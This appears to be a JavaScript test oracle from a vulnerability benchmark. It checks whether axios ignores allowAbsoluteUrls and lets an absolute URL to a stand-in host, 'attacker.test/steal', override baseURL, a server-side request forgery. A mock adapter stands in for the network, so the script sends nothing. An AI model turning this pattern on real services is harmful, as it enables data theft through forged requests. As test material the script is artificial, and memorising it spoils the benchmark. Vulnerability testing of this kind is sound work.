const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  try {
    const axiosMod = require('axios');
    const axios = axiosMod && axiosMod.default ? axiosMod.default : axiosMod;

    const markerDir = path.join(os.tmpdir(), `oracle-axios-ssrf-${process.pid}-${Date.now()}`);
    fs.mkdirSync(markerDir, { recursive: true });
    const markerFile = path.join(markerDir, 'marker.txt');
    fs.writeFileSync(markerFile, 'oracle');

    let benignObservedUri = '';

    try {
      const benignClient = axios.create({
        baseURL: 'http://example.test/api/',
        allowAbsoluteUrls: true
      });

      const benignResp = await benignClient.get('users?id=1', {
        adapter: async (config) => {
          benignObservedUri = String((config && (config.url || config.baseURL)) || '');
          return {
            data: { ok: true },
            status: 200,
            statusText: 'OK',
            headers: {},
            config,
            request: {}
          };
        }
      });

      if (!benignResp || benignResp.status !== 200) {
        throw new Error('benign_status_invalid');
      }
    } catch (e) {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'benign_exception:' + String((e && e.message) || e)
      }));
      return;
    }

    let seenInputUrl = '';
    let usedAllowAbsolute = undefined;
    let adapterCalled = false;
    let maliciousThrew = false;

    try {
      await axios.get('http://attacker.test/steal?x=1', {
        baseURL: 'http://example.test/api/',
        allowAbsoluteUrls: false,
        adapter: async (config) => {
          adapterCalled = true;
          seenInputUrl = String((config && config.url) || '');
          usedAllowAbsolute = config ? config.allowAbsoluteUrls : undefined;
          return {
            data: { ok: true },
            status: 200,
            statusText: 'OK',
            headers: {},
            config,
            request: {}
          };
        }
      });
    } catch (e) {
      maliciousThrew = true;
      seenInputUrl = 'threw:' + String((e && e.message) || e);
    }

    operation_completed = true;

    const absoluteAttacker = /^https?:\/\/attacker\.test(?::\d+)?\//i.test(seenInputUrl) || /^https?:\/\/attacker\.test(?::\d+)?$/i.test(seenInputUrl);
    exploit_succeeded = operation_completed && adapterCalled && !maliciousThrew && absoluteAttacker;

    evidence = [
      'benign_observed_uri=' + benignObservedUri,
      'malicious_seen_url=' + seenInputUrl,
      'allowAbsoluteUrls=' + String(usedAllowAbsolute),
      'adapter_called=' + String(adapterCalled),
      'malicious_threw=' + String(maliciousThrew),
      'marker=' + markerFile
    ].join(';');

    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed,
      exploit_succeeded,
      evidence
    }));
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'setup_or_runtime_exception:' + String((e && e.message) || e)
    }));
  }
})();